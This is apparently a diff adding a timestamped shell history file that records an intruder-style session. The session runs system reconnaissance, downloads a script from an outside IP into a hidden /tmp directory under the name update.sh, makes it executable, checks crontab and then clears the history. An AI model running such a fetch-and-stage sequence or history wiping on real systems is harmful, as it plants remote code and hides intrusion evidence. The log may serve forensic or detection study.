@@ -1,0 +1,12 @@
+#1791948005
+id
+#1791948041
+uname -a
+#1791948070
+wget http://198.51.100.20/x.sh -O /tmp/.x/update.sh
+#1791948150
+chmod +x /tmp/.x/update.sh
+#1791948182
+crontab -l
+#1791948255
+history -c
